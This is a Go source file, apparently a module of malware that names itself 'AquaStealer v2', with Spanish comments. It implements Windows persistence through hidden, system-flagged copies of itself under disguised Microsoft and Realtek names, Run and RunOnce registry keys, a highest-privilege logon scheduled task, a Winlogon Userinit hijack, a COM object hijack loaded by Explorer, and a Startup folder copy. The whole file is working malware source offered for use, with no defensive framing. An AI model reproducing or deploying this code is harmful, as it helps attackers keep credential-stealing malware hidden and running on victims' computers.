package startup

// startup.go — AquaStealer v2 — Persistencia x5
//
// Métodos:
//   1. HKCU\Run — registry run key (nombre falso: Realtek HD Audio)
//   2. HKCU\RunOnce — backup por si Run falla
//   3. Scheduled Task — schtasks /create con ONLOGON trigger, HIGHEST privileges
//   4. HKCU\Winlogon Userinit — hijack del userinit (persiste en login)
//   5. COM object hijack — HKCU\Software\Classes\CLSID registro de COM con DLL sideload
//   Bonus: copia en múltiples ubicaciones, marca como sistema+oculto

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"github.com/aqua/stealer/utils/fileutil"
	"golang.org/x/sys/windows/registry"
)

const (
	taskName    = "MicrosoftEdgeUpdateTaskMachineCore"
	fakeRegName = "Realtek HD Audio Universal Service"
	fakeName    = "SecurityHealthSystray.exe"
	fakeName2   = "MicrosoftEdgeUpdate.exe"
)

// copyToPath copia el exe actual a dst, marca como hidden+system
func copyToPath(dst string) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	if fileutil.Exists(dst) {
		_ = os.Remove(dst)
	}
	if err := fileutil.CopyFile(exe, dst); err != nil {
		return err
	}
	_ = exec.Command("attrib", "+h", "+s", dst).Run()
	return nil
}

// RegistryRunKey — HKCU\Software\Microsoft\Windows\CurrentVersion\Run
func RegistryRunKey(path string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue(fakeRegName, path)
}

// RegistryRunOnceKey — HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
func RegistryRunOnceKey(path string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue(fakeRegName+"2", path)
}

// ScheduledTask — crea una tarea programada que se ejecuta en cada login
func ScheduledTask(path string) error {
	cmd := exec.Command("schtasks", "/create", "/f",
		"/sc", "ONLOGON",
		"/rl", "HIGHEST",
		"/tn", taskName,
		"/tr", fmt.Sprintf(`"%s"`, path),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// WinlogonUserinit — agrega al Userinit de Winlogon (persiste incluso si se borra Run)
// Nota: requiere que userinit.exe siga siendo el primero
func WinlogonUserinit(path string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.ALL_ACCESS)
	if err != nil {
		// si no existe en HKCU, usar HKLM (requiere admin)
		k, err = registry.OpenKey(registry.LOCAL_MACHINE,
			`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`,
			registry.ALL_ACCESS)
		if err != nil {
			return err
		}
	}
	defer k.Close()
	// Leer valor actual y agregar nuestro exe al final
	current, _, _ := k.GetStringValue("Userinit")
	if current == "" {
		current = `C:\Windows\system32\userinit.exe,`
	}
	if !containsStr(current, path) {
		return k.SetStringValue("Userinit", current+","+path+",")
	}
	return nil
}

// COMHijack — registra un COM server falso en HKCU (no requiere admin)
// HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 → nuestro exe
// Usando un CLSID conocido que Windows carga automáticamente
func COMHijack(path string) error {
	// {B4F3A835-0E21-11D3-A498-00A0C9062910} — usado por explorer
	clsid := `Software\Classes\CLSID\{B4F3A835-0E21-11D3-A498-00A0C9062910}\InprocServer32`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, clsid, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	if err := k.SetStringValue("", path); err != nil {
		return err
	}
	return k.SetStringValue("ThreadingModel", "Apartment")
}

// StartupFolder — copia en la carpeta Startup del usuario
func StartupFolder(path string) error {
	startupDir := filepath.Join(os.Getenv("APPDATA"),
		`Microsoft\Windows\Start Menu\Programs\Startup`)
	dst := filepath.Join(startupDir, fakeName2)
	return copyToPath(dst)
}

func containsStr(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub ||
		len(s) > 0 && (s[:len(sub)] == sub || s[len(s)-len(sub):] == sub))
}

func Run() error {
	// Ruta primaria en %APPDATA%\Microsoft\Protect\
	dir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Protect`)
	_ = os.MkdirAll(dir, 0755)
	primary := filepath.Join(dir, fakeName)

	if err := copyToPath(primary); err != nil {
		// fallback a %TEMP%
		primary = filepath.Join(os.Getenv("TEMP"), fakeName)
		_ = copyToPath(primary)
	}

	// Ruta secundaria en %LOCALAPPDATA%\Microsoft\
	dir2 := filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft`)
	secondary := filepath.Join(dir2, fakeName2)
	_ = copyToPath(secondary)

	// Métodos de persistencia
	_ = RegistryRunKey(primary)
	_ = RegistryRunOnceKey(secondary)
	_ = ScheduledTask(primary)
	_ = WinlogonUserinit(primary)
	_ = COMHijack(primary)
	_ = StartupFolder(primary)

	return nil
}
